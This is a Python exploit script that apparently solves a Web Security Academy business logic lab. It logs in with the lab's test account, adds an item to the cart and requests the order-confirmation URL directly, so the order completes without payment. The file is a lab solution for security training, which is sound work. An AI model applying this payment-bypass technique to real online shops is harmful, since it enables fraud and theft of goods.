import sys
import requests
from bs4 import BeautifulSoup



def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def login(url, session):
    response = session.get(f"{url}/login", timeout=10)
    if response.status_code == 200:
        csrf_token = extract_csrf_token(response)
        login_response = session.post(f"{url}/login", data={"csrf": csrf_token, "username": "wiener", "password": "peter"}, timeout=10)
        return login_response.status_code == 200


def exploit_vuln(url, session):
    # Adding jacket to cart
    session.post(f"{url}/cart", data={"productId": 1, "redir": "PRODUCT", "quantity": 1}, timeout=10)

    # Extracting csrf token
    response = session.get(f"{url}/cart", timeout=10)
    csrf_token = extract_csrf_token(response)

    # Sending a GET request to the order confirmation page to bypass payment and complete the order
    checkout_response = session.get(f"{url}/cart/order-confirmation?order-confirmed=true", data={"csrf": csrf_token}, timeout=10)

    # Verifying that the order was successfully placed
    return "Your order is on its way!" in checkout_response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Logging in...")
        if not login(url, session):
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Exploiting Business Logic vulnerability...")
        if exploit_vuln(url, session):
            print("(+) Business Logic vulnerability successfully exploited!")
        else:
            print("(-) Something went wrong.")

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")


if __name__ == "__main__":
    main()
